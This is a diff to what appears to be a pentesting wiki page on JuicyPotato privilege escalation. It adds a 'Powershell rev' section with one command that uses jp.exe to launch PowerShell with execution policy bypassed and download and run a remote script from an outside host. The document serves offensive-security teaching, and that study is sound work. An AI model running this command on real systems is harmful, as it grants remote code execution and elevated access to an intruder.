@@ -85,6 +85,12 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 c:\Users\Public>
 ```
 
+### Powershell rev
+
+```text
+.\jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
+```
+
 ### Launch a new CMD \(if you have RDP access\)
 
 ![](../../.gitbook/assets/image%20%2860%29.png)
